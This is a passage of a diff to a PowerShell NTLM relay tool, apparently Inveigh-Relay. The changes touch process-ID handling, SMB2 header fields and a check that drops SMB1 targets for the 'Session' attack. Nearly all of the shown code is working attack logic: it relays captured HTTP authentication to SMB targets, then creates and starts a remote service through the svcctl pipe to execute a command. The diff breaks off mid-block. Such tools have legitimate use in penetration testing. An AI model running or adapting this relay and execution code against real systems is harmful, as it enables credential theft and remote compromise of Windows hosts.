@@ -238,6 +238,11 @@ if($Attack -eq 'Execute' -and !$Command)
     Write-Output "[-] -Command requiried with -Attack Execute"
     throw
 }
+elseif($Attack -eq 'Session' -and $SMB1)
+{
+    Write-Output "[-] -SMB1 not suppported with -Attack Session"
+    throw
+}
 
 if(!$FileOutputDirectory)
 { 
@@ -396,6 +401,11 @@ else
     $inveigh.newline = ""
 }
 
+if($inveigh.running)
+{
+    $inveigh.output_pause = $true
+}
+
 # Write startup messages
 $inveigh.output_queue.Add("[*] Inveigh Relay $inveigh_version started at $(Get-Date -format s)") > $null
 
@@ -410,7 +420,7 @@ if($HTTP -eq 'Y')
     if($HTTP_port_check)
     {
         $HTTP = "N"
-        $inveigh.output_queue.Add("[+] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
+        $inveigh.output_queue.Add("[-] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
     }
     else
     {
@@ -727,7 +737,7 @@ elseif($RunTime -gt 1)
 
 if($ShowHelp -eq 'Y')
 {
-    $inveigh.output_queue.Add("[!] Run Stop-Inveigh to stop Inveigh-Relay") > $null
+    $inveigh.output_queue.Add("[!] Run Stop-Inveigh to stop manually") > $null
         
     if($inveigh.console_output)
     {
@@ -796,10 +806,10 @@ while($inveigh.output_queue.Count -gt 0)
 
 }
 
-$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
-$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
-$process_ID = $process_ID -replace "-00-00",""
-[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+if($inveigh.running)
+{
+    $inveigh.output_pause = $false
+}
 
 # Begin ScriptBlocks
 
@@ -812,6 +822,7 @@ $shared_basic_functions_scriptblock =
         param ([Int]$length_start,[Byte[]]$string_extract_data)
 
         $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
+
         return $string_length
     }
 
@@ -820,6 +831,7 @@ $shared_basic_functions_scriptblock =
         param ([Int]$length_start,[Byte[]]$string_extract_data)
 
         $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
+
         return $string_length
     }
 
@@ -831,6 +843,7 @@ $shared_basic_functions_scriptblock =
         $string_data = $string_data -replace "-00",""
         $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
+
         return $string_extract
     }
 
@@ -850,6 +863,16 @@ $packet_functions_scriptblock =
 
         return $byte_array
     }
+
+    function Get-ProcessIDArray
+    {
+        $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
+        $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
+        [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+
+        return $process_ID_bytes
+    }
+
 
     #NetBIOS
 
@@ -872,6 +895,8 @@ $packet_functions_scriptblock =
     function New-PacketSMBHeader
     {
         param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)
+
+        $packet_process_ID = $packet_process_ID[0,1]
 
         $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
         $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
@@ -1087,7 +1112,7 @@ $packet_functions_scriptblock =
 
     function New-PacketSMB2Header
     {
-        param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)
+        param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)
 
         [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00
 
@@ -1102,12 +1127,21 @@ $packet_functions_scriptblock =
         $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
         $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
         $packet_SMB2Header.Add("MessageID",$packet_message_ID)
-        $packet_SMB2Header.Add("ProcessID",[Byte[]](0x00,0x00,0x00,0x00))
+        $packet_SMB2Header.Add("ProcessID",$packet_process_ID)
         $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
         $packet_SMB2Header.Add("SessionID",$packet_session_ID)
         $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
 
         return $packet_SMB2Header
+    }
+
+    function New-PacketSMB2Echo
+    {
+        $packet_SMB2EchoRequest = New-Object System.Collections.Specialized.OrderedDictionary
+        $packet_SMB2EchoRequest.Add("StructureSize",[Byte[]](0x04,0x00))
+        $packet_SMB2EchoRequest.Add("Reserved",[Byte[]](0x00,0x00))
+
+        return $packet_SMB2EchoRequest
     }
 
     function New-PacketSMB2NegotiateProtocolRequest
@@ -1596,7 +1630,7 @@ $SMB_relay_functions_scriptblock =
 
     function SMBRelayChallenge
     {
-        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$signing_check)
+        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$SMB_process_ID)
 
         if($SMB_relay_socket)
         {
@@ -1614,7 +1648,7 @@ $SMB_relay_functions_scriptblock =
 
                 'NegotiateSMB'
                 {
-                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $inveigh.process_ID_bytes 0x00,0x00       
+                    $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $SMB_process_ID 0x00,0x00       
                     $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                     $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                     $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -1627,8 +1661,20 @@ $SMB_relay_functions_scriptblock =
 
                     if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                     {
-                        $SMB_version = 'SMB1'
-                        $SMB_client_stage = 'NTLMSSPNegotiate'
+
+                        if($Attack -eq 'Session')
+                        {
+                            $inveigh.target_list.Remove($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString)
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed target $($SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString) due to SMB1 requirement")
+                            $SMB_relay_socket.Close()
+                            $SMB_client_stage = 'exit'
+                        }
+                        else
+                        {
+                            $SMB_version = 'SMB1'
+                            $SMB_client_stage = 'NTLMSSPNegotiate'
+                        }
+                        
                     }
                     else
                     {
@@ -1656,7 +1702,7 @@ $SMB_relay_functions_scriptblock =
                     $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                     $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                     $SMB2_message_ID = 1
-                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  
+                    $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID  
                     $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                     $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                     $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -1674,7 +1720,7 @@ $SMB_relay_functions_scriptblock =
                     
                     if($SMB_version -eq 'SMB1')
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $inveigh.process_ID_bytes 0x00,0x00
+                        $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $SMB_process_ID 0x00,0x00
                         $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
@@ -1686,8 +1732,8 @@ $SMB_relay_functions_scriptblock =
                     }
                     else
                     {
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
@@ -1713,7 +1759,7 @@ $SMB_relay_functions_scriptblock =
 
     function SMBRelayResponse
     {
-        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$SMB_user_ID,$SMB_session_ID)
+        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version,$SMB_user_ID,$SMB_session_ID,$SMB_process_ID)
     
         $SMB_client_receive = New-Object System.Byte[] 1024
 
@@ -1724,7 +1770,7 @@ $SMB_relay_functions_scriptblock =
 
         if($SMB_version -eq 'SMB1')
         {
-            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $inveigh.process_ID_bytes $SMB_user_ID
+            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x01,0x48 0xff,0xff $SMB_process_ID $SMB_user_ID
             $packet_SMB_header["UserID"] = $SMB_user_ID
             $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes
             $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
@@ -1739,7 +1785,7 @@ $SMB_relay_functions_scriptblock =
         {
             $SMB2_message_ID = 3
             $SMB2_tree_ID = 0x00,0x00,0x00,0x00
-            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
             $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes
             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
             $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
@@ -1764,10 +1810,10 @@ $SMB_relay_functions_scriptblock =
 
             if($HTTP_NTLM_domain_string -ne '')
             {
-                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target")
+                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
             }
 
-            $inveigh.relay_list.Add("$HTTP_source_IP $Target")
+            $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
             $SMB_relay_failed = $true
             $SMB_relay_socket.Close()
             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target") > $null
@@ -1778,7 +1824,7 @@ $SMB_relay_functions_scriptblock =
 
     function SMBRelayExecute
     {
-        param ($SMB_relay_socket,$SMB_version,$SMB_user_ID,$SMB_session_ID)
+        param ($SMB_relay_socket,$SMB_version,$SMB_user_ID,$SMB_session_ID,$SMB_process_ID)
 
         $SMB_client_receive = New-Object System.Byte[] 1024
 
@@ -1852,7 +1898,7 @@ $SMB_relay_functions_scriptblock =
         
                     'TreeConnectAndXRequest'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -1869,7 +1915,7 @@ $SMB_relay_functions_scriptblock =
                     {
                         $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                         $SMB_tree_ID = $SMB_client_receive[28,29]
-                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -1885,7 +1931,7 @@ $SMB_relay_functions_scriptblock =
                     'RPCBind'
                     {
                         $SMB_FID = $SMB_client_receive[42,43]
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
@@ -1905,7 +1951,7 @@ $SMB_relay_functions_scriptblock =
                     'ReadAndXRequest'
                     {
                         Start-Sleep -m 150
-                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBReadAndXRequest
                         $packet_SMB_data["FID"] = $SMB_FID
@@ -1921,7 +1967,7 @@ $SMB_relay_functions_scriptblock =
             
                     'OpenSCManagerW'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
@@ -1967,12 +2013,12 @@ $SMB_relay_functions_scriptblock =
 
                             if($HTTP_NTLM_domain_string -ne '')
                             {
-                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target")
+                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
                             }
 
                             if(!$inveigh.relay_list.Contains("$HTTP_source_IP $Target"))
                             {
-                                $inveigh.relay_list.Add("$HTTP_source_IP $Target")
+                                $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
                             }
 
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full does not have execution privilege on $Target") > $null
@@ -1986,7 +2032,7 @@ $SMB_relay_functions_scriptblock =
             
                     'CreateServiceW'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
@@ -2008,7 +2054,7 @@ $SMB_relay_functions_scriptblock =
                     'CreateServiceW_First'
                     {
                         $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                         $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                         $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
@@ -2040,7 +2086,7 @@ $SMB_relay_functions_scriptblock =
                     'CreateServiceW_Middle'
                     {
                         $SMB_split_stage++
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                         $SMB_split_index_tracker += $SMB_split_index
                         $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
@@ -2070,7 +2116,7 @@ $SMB_relay_functions_scriptblock =
 
                     'CreateServiceW_Last'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                         $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
@@ -2096,7 +2142,7 @@ $SMB_relay_functions_scriptblock =
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service created on $Target") > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute SMB relay command on $Target") > $null
                             $SMB_service_context_handle = $SMB_client_receive[92..111]
-                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                             $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
@@ -2138,7 +2184,7 @@ $SMB_relay_functions_scriptblock =
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service failed to start on $Target") > $null
                         }
 
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
@@ -2173,7 +2219,7 @@ $SMB_relay_functions_scriptblock =
                             $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                         }
 
-                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
@@ -2191,7 +2237,7 @@ $SMB_relay_functions_scriptblock =
 
                     'CloseRequest'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -2206,7 +2252,7 @@ $SMB_relay_functions_scriptblock =
 
                     'TreeDisconnect'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -2221,7 +2267,7 @@ $SMB_relay_functions_scriptblock =
 
                     'Logoff'
                     {
-                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $inveigh.process_ID_bytes $SMB_user_ID
+                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $SMB_process_ID $SMB_user_ID
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                         $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
@@ -2260,7 +2306,7 @@ $SMB_relay_functions_scriptblock =
                     {
                         $SMB2_message_ID = 4
                         $SMB2_tree_ID = 0x00,0x00,0x00,0x00
-                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
@@ -2277,8 +2323,8 @@ $SMB_relay_functions_scriptblock =
                     {
                         $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                         $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                         $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
@@ -2296,8 +2342,8 @@ $SMB_relay_functions_scriptblock =
                     {
                         $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                         $SMB_file_ID = $SMB_client_receive[132..147]
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                         $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
@@ -2316,12 +2362,11 @@ $SMB_relay_functions_scriptblock =
             
                     'ReadRequest'
                     {
-
                         Start-Sleep -m 150
-                        $SMB2_message_ID += 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                        $packet_SMB2_header["CreditCharge"] = 0x10,0x00
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
+                        $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                         $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                         $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -2355,8 +2400,8 @@ $SMB_relay_functions_scriptblock =
             
                     'OpenSCManagerW'
                     {
-                        $SMB2_message_ID = 30
-                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x7f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
@@ -2383,13 +2428,12 @@ $SMB_relay_functions_scriptblock =
                             $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                             $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has required privilege on $Target") > $null
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $Target") > $null
 
                             if($Attack -eq 'Session')
                             {
                                 $SMB_administrator = $true
                                 $SMB_close_service_handle_stage = 2
-                                $SMB2_message_ID += 19
                                 $SMB_client_stage = 'CloseServiceHandle'
                             }
                             elseif($SCM_data.Length -lt $SMB_split_index)
@@ -2407,24 +2451,24 @@ $SMB_relay_functions_scriptblock =
 
                             if($HTTP_NTLM_domain_string -ne '')
                             {
-                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target")
+                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
                             }
 
                             if(!$inveigh.relay_list.Contains("$HTTP_source_IP $Target"))
                             {
-                                $inveigh.relay_list.Add("$HTTP_source_IP $Target")
+                                $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
                             }
                             
                             if($Attack -ne 'Session')
                             {
                                 $SMB_relay_failed = $true
-                                $inveigh.relay_list.Add("0 $HTTP_source_IP $HTTP_username_full $Target")
